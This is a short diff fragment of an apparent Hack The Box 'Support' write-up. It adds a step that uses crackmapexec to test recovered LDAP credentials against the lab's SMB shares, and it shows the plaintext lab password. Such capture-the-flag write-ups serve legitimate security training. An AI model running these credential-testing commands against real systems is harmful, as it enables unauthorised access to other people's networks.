@@ -291,3 +291,10 @@ unzip UserInfo.exe.zip -d UserInfo
 ```shell
 LDPA Creds: ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
+
+### Verify Credentials
+```shel
+crackmapexec smb support.htb -d support -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/81d35e30-1687-4770-8673-e08eebc615d4)
+
